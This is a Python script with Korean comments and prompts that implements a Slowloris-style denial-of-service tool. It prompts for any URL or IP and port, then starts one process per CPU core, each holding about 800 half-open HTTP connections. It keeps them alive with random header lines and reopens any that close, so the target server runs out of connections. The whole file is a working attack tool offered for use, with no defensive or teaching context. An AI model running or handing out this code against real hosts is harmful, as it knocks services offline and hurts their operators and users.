import socket
import os
import time
import random
from multiprocessing import Process, Value
from urllib.parse import urlparse

# User-Agent 헤더값
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
]


# class SYN_Flooding

def build_request(host):
    ua = random.choice(USER_AGENTS)
    return (f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n").encode()

def open_conn(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        s.send(build_request(host))
        return s
    except Exception:
        return None


def worker(host, port, per_proc, counter, stop_after):
    sockets = []
    start = time.time()

    for _ in range(per_proc):
        s = open_conn(host, port)
        if s:
            sockets.append(s)
            with counter.get_lock():
                counter.value += 1
    try:
        while True:
            if stop_after and (time.time() - start) >= stop_after:
                break
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 99999)}\r\n".encode())
                except Exception:
                    sockets.remove(s)
                    with counter.get_lock():
                        counter.value -= 1
                    ns = open_conn(host, port)
                    if ns:
                        sockets.append(ns)
                        with counter.get_lock():
                            counter.value += 1
            time.sleep(10)
    except KeyboardInterrupt:
        pass
    finally:
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass


def reporter(counter, stop_flag):
    try:
        while not stop_flag.value:
            print(f"[*] 유지 중인 연결: {counter.value}")
            time.sleep(1)
    except KeyboardInterrupt:
        pass


def resolve_target(raw):
    raw = raw.strip()

    if "://" in raw:
        raw = urlparse(raw).netloc or urlparse(raw).path
    if ":" in raw:
        raw = raw.split(":")[0]
    ip = socket.gethostbyname(raw)
    return raw, ip


if __name__=='__main__':
    target = input("URL/IP: ").strip()
    port = int(input("포트(기본 80): ") or "80")

    host, ip = resolve_target(target)
    print(f"[*] 대상: {host} ({ip}):{port}")

    counter = Value("i", 0)
    stop_flag = Value("i", 0)

    processes = os.cpu_count()
    conns = 800

    print(f"[*] Connection Flood → {ip}:{port}")
    print(f"[*] 프로세스 {processes} × 연결 {conns} = 목표 {processes * conns}")
    print("[*] 중단: Ctrl+C")

    procs = [Process(target=worker, args=(ip, port, conns, counter, 0))
             for _ in range(processes)]
    rep = Process(target=reporter, args=(counter, stop_flag))

    for p in procs:
        p.start()
    rep.start()

    try:
        for p in procs:
            p.join()
    except KeyboardInterrupt:
        print("\n[*] 중단 — 연결 정리 중...")
    finally:
        stop_flag.value = 1
        for p in procs:
            p.terminate()
        rep.terminate()
        print("[*] 종료")
